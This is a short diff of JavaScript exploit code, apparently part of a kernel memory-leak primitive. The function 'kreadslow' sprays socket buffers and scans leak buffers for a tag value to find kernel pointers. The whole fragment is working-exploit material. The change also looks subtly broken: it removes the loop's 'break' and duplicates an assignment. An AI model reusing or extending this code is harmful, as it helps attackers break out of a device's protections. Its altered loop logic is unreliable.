@@ -1555,7 +1555,6 @@ function kreadslow(addr, size) {
       return BigInt_Error;
     }
   }
-  
   write32(sockopt_val_buf, size);
   setsockopt(new BigInt(uio_sock_1), SOL_SOCKET, SO_SNDBUF, sockopt_val_buf, 4);
   write(new BigInt(uio_sock_1), tmp, size);
@@ -1626,19 +1625,15 @@ function kreadslow(addr, size) {
     read(new BigInt(iov_sock_0), tmp, 1);
   }
   read(new BigInt(uio_sock_0), tmp, size);
-
   var leak_buffer = new BigInt(0);
-
   for (var k = 0; k < UIO_THREAD_NUM; k++) {
-      read(new BigInt(uio_sock_0), leak_buffers[k], size);
-
-      var val = read64(leak_buffers[k]);
-
-      if (val.eq(LEAK_TAG)) {
-          leak_buffer = leak_buffers[k].add(0);
-          triplets[1] = find_triplet(triplets[0], -1);
-          break;
-      }
+    read(new BigInt(uio_sock_0), leak_buffers[k], size);
+    var val = read64(leak_buffers[k]);
+    if (val.eq(LEAK_TAG)) {
+      leak_buffer = leak_buffers[k].add(0);
+      triplets[1] = find_triplet(triplets[0], -1);
+      leak_buffer = leak_buffers[k].add(0);
+    }
   }
   wait_uio_writev();
   write(new BigInt(iov_sock_1), tmp, 1);
